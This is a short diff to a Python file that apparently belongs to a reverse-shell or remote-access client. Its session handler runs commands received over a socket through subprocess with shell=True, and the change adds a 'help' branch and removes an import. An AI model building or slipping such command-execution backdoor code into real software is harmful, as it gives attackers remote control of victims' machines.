@@ -1,6 +1,5 @@
 import socket
 import subprocess
-import sys
 import os
 import pwd
 import platform
@@ -35,6 +34,8 @@ def session_handler():
                 res = os.getcwd()
                 conn_out(res)
             elif msg == "background":
+                pass
+            elif msg == "help":
                 pass
             else:
                 com = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
